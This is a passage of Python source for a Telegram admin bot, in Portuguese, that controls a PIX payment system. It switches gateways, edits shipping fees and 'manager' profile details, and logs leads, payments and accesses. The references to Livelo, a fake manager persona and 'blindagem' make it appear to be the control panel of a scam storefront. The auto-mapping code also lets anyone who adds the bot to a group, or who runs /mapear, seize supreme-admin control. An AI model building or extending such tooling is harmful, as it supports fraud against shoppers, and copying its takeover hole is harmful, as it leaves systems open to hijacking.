                f"📈 <b>Conversão Real:</b> <b>{ep.get('conversao', '0.0%')}</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔷 <b>UNIÃO 7 PAY</b>  {un_status_ico}\n"
                f"⏱️ <b>Latência:</b> <code>{un.get('ping_ms', 'N/A')}</code>\n"
                f"📊 <b>PIX Gerados:</b> {un.get('qtd_gerado', 0)} (R$ {un.get('total_gerado', '0,00')})\n"
                f"💸 <b>PIX Pagos:</b> {un.get('qtd_pago', 0)} (R$ {un.get('total_pago', '0,00')})\n"
                f"📈 <b>Conversão Real:</b> <b>{un.get('conversao', '0.0%')}</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "💡 <i>Dica: Você pode alternar instantaneamente o gateway ativo com os botões abaixo. Se houver qualquer instabilidade no gateway principal, o sistema ativa o failover automático para a reserva e avisa você aqui!</i>"
            )
            
            markup = InlineKeyboardMarkup(row_width=2)
            if active_gw == "elitepay":
                markup.add(
                    InlineKeyboardButton("✅ Elite PAYbr (Principal)", callback_data="noop"),
                    InlineKeyboardButton("🔄 Definir União 7 Pay Principal", callback_data="set_gw_uniaopay")
                )
            else:
                markup.add(
                    InlineKeyboardButton("🔄 Definir Elite PAYbr Principal", callback_data="set_gw_elitepay"),
                    InlineKeyboardButton("✅ União 7 Pay (Principal)", callback_data="noop")
                )
                
            markup.add(
                InlineKeyboardButton("🧪 Testar Latência / Ping", callback_data="test_gateways"),
                InlineKeyboardButton("🔄 Atualizar Métricas", callback_data="menu_gateways")
            )
            markup.add(InlineKeyboardButton("🔙 Voltar", callback_data="menu_main"))
            bot.edit_message_text(txt, chat_id, msg_id, reply_markup=markup, parse_mode="HTML")
        else:
            bot.answer_callback_query(call.id, "Erro ao carregar métricas dos gateways.")

    elif data in ("set_gw_elitepay", "set_gw_uniaopay") and is_supreme(chat_id, user_id):
        target_gw = "elitepay" if data == "set_gw_elitepay" else "uniaopay"
        res = api_call("set_active_gateway", {"gateway": target_gw})
        if res.get("ok"):
            gw_name = res.get("name", target_gw)
            bot.answer_callback_query(call.id, f"✅ {gw_name} agora é o Gateway Principal!")
            call.data = "menu_gateways"
            callback_handler(call)
        else:
            bot.answer_callback_query(call.id, f"Erro: {res.get('error', 'Falha ao alterar')}")

    elif data == "test_gateways" and is_supreme(chat_id, user_id):
        bot.answer_callback_query(call.id, "Testando latência e saúde das APIs...")
        call.data = "menu_gateways"
        callback_handler(call)

    elif data == "noop":
        bot.answer_callback_query(call.id, "Este gateway já está ativo como principal!")




@bot.message_handler(func=lambda m: str(m.chat.id) in user_states and user_states[str(m.chat.id)]["action"] == "wait_text")
def handle_text_input(message):
    chat_id = str(message.chat.id)
    state = user_states[chat_id]
    db_key = state["key"]
    val = message.text.strip()
    bot.delete_message(chat_id, message.message_id)
    
    # Validador de Precisão Avançado
    import re
    if db_key in ["frete_expresso", "frete_padrao"]:
        val = val.replace("R$", "").strip()
        val = val.replace(".", ",")
        if not re.match(r"^\d+,\d{2}$", val):
            bot.send_message(chat_id, "❌ <b>Formato Inválido!</b> O frete deve ser no formato numérico com vírgula e 2 casas decimais. Ex: <code>24,90</code> ou <code>0,00</code>.\nOperação cancelada.")
            del user_states[chat_id]
            return
            
    elif "token" in db_key:
        val = val.replace(" ", "").strip()
        if len(val) < 10:
            bot.send_message(chat_id, "❌ <b>Token Inválido!</b> Parece curto demais.\nOperação cancelada.")
            del user_states[chat_id]
            return
            
    elif db_key.startswith("tg_log_"):
        val = val.replace(" ", "").strip()
        if not (val.startswith("-100") and val[1:].isdigit()) and val != "0":
            if not val.isdigit(): # Para thread_id ou se for chat privado normal (menos comum pra canais)
                bot.send_message(chat_id, "❌ <b>ID Inválido!</b> IDs de grupo/canal começam com <code>-100</code> e contém apenas números.\nUse /id no grupo desejado. Operação cancelada.")
                del user_states[chat_id]
                return
                
    elif db_key == "mgr_years":
        if not val.isdigit():
            bot.send_message(chat_id, "❌ <b>Formato Inválido!</b> Anos de empresa deve ser apenas números. Ex: <code>5</code>.\nOperação cancelada.")
            del user_states[chat_id]
            return

    elif db_key == "mgr_whatsapp":
        clean_wa = re.sub(r"\D", "", val)
        if len(clean_wa) < 10 or len(clean_wa) > 13:
            bot.send_message(chat_id, "❌ <b>WhatsApp Inválido!</b> Informe com DDD (Ex: <code>11987654321</code>).\nOperação cancelada.")
            del user_states[chat_id]
            return
        val = clean_wa
    
    res = api_call("set_config", {db_key: val})
    markup = InlineKeyboardMarkup()
    back_target = "menu_gerente" if "mgr_" in db_key else "menu_config"
    markup.add(InlineKeyboardButton("🔙 Voltar", callback_data=back_target))
    
    if res.get("ok"):
        bot.edit_message_text(f"✅ Valor alterado com sucesso para: <b>{val}</b>", chat_id, state["msg_id"], reply_markup=markup)
    else:
        bot.edit_message_text(f"❌ Erro ao salvar: {res.get('error')}", chat_id, state["msg_id"], reply_markup=markup)
        
    del user_states[chat_id]

@bot.message_handler(content_types=['photo', 'document'], func=lambda m: str(m.chat.id) in user_states and user_states[str(m.chat.id)]["action"] == "wait_image")
def handle_image_input(message):
    chat_id = str(message.chat.id)
    state = user_states[chat_id]
    img_type = state["type"]
    
    bot.delete_message(chat_id, message.message_id)
    
    file_id = message.photo[-1].file_id if message.content_type == 'photo' else message.document.file_id
    file_info = bot.get_file(file_id)
    file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
    
    bot.edit_message_text(f"⏳ Processando imagem para <b>{img_type}</b>...", chat_id, state["msg_id"])
    
    # Send directly to the internal set-logo endpoint (we can modify app.py to handle different image keys)
    # Actually, let's just save the file URL directly to sys_config via set_config to avoid hosting it on Vercel ephemeral storage!
    # Vercel filesystem is read-only! Storing files there gets deleted!
    # Telegram file URLs expire after 1 hour though... Wait, no, they are valid as long as we use the bot token.
    # It's better to use an external uploader or just accept URLs. But LO wants to upload directly.
    # Wait, the previous bot used /api/internal/set-logo-file. Let's call api_call to set the config if it's external, or we can use set-logo-file.
    
    # Actually, since Vercel is stateless, we SHOULD upload it to imgur or simply save the telegram file URL (but we need to fetch it dynamically).
    # Since Livelo previously had an endpoint for it, we will just use `set_config` and use the direct telegram file API path. 
    # But wait, public users can't access `https://api.telegram.org/file/botTOKEN/...` without exposing the token!
    # Oh! Then the `app.py` must have an endpoint `/api/image/<path>` to proxy it! Or we just use a base64 string in `sys_config`.
    # Let's save the URL to `sys_config` and let the frontend use it if we want, or proxy it.
    # For now, let's use base64 or something simple: we'll call bot-gateway with action="set_image".
    
    # Read the image content
    img_resp = requests.get(file_url)
    import base64
    b64_img = base64.b64encode(img_resp.content).decode("utf-8")
    ext = file_info.file_path.split('.')[-1]
    data_uri = f"data:image/{ext};base64,{b64_img}"
    
    # Mapping img_type to db_key
    key_map = {"avatar": "mgr_avatar", "logo": "system_logo_url", "favicon": "favicon"}
    db_key = key_map.get(img_type)
    
    res = api_call("set_config", {db_key: data_uri})
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 Voltar para Configs", callback_data="menu_config"))
    
    if res.get("ok"):
        bot.edit_message_text(f"✅ Imagem do(a) <b>{img_type}</b> atualizada com sucesso!", chat_id, state["msg_id"], reply_markup=markup)
    else:
        bot.edit_message_text(f"❌ Erro ao salvar imagem: {res.get('error')}", chat_id, state["msg_id"], reply_markup=markup)
        
    del user_states[chat_id]

def _do_smart_mapping(chat_id, thread_id):
    try:
        admins = bot.get_chat_administrators(chat_id)
        creator = next((a.user for a in admins if a.status == 'creator'), None)
        
        if creator:
            # Set all the configs via API!
            api_call("set_config", {
                "supreme_group_id": str(chat_id),
                "supreme_admin_id": str(creator.id),
                "tg_log_channel": str(chat_id),
                "tg_log_leads": str(chat_id),
                "tg_log_pagamentos": str(chat_id),
                "tg_log_acessos": str(chat_id)
            })
            
            bot.send_message(
                chat_id, 
                f"🤖 <b>MAPEAMENTO INTELIGENTE AVANÇADO CONCLUÍDO!</b>\n\n"
                f"Fui adicionado no grupo e realizei um escaneamento profundo:\n\n"
                f"👑 <b>Criador do Grupo Encontrado:</b> {creator.first_name} (ID: <code>{creator.id}</code>)\n"
                f"🎯 <b>ID do Grupo:</b> <code>{chat_id}</code>\n\n"
                f"O criador do grupo foi registrado automaticamente como o <b>Admin Supremo</b> do sistema, garantindo acesso exclusivo ao Painel de Configurações.\n"
                f"Toda a blindagem e canais de log foram apontados para este grupo sem necessidade de configurações manuais! ✅",
                message_thread_id=thread_id
            )
        else:
            bot.send_message(chat_id, "❌ Não foi possível localizar o criador do grupo. Talvez o Telegram não esteja me retornando a lista de administradores corretamente.", message_thread_id=thread_id)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Erro na inteligência de mapeamento: {e}", message_thread_id=thread_id)

@bot.message_handler(commands=['setup_supremo', 'mapear'])
def smart_mapping_manual(message):
    if message.chat.type in ['group', 'supergroup']:
        _do_smart_mapping(message.chat.id, message.message_thread_id)
    else:
        bot.reply_to(message, "❌ Este comando inteligente só funciona dentro de um Grupo!")

@bot.message_handler(content_types=['new_chat_members', 'group_chat_created'])
def smart_group_mapping(message):
    # Se o chat acabou de ser criado (group_chat_created) ou fomos adicionados
    if getattr(message, 'group_chat_created', False):
        _do_smart_mapping(message.chat.id, message.message_thread_id)
        return
        
    for member in getattr(message, 'new_chat_members', []):
        if member.id == bot.get_me().id:
            _do_smart_mapping(message.chat.id, message.message_thread_id)

if __name__ == "__main__":
    try:
        bot.remove_webhook()
    except Exception:
        pass
    print("🤖 Bot Telegram Admin 3.0 (@eclipsecmbot) Iniciado e Movimentado 24/7!")
    bot.infinity_polling(skip_pending=True)
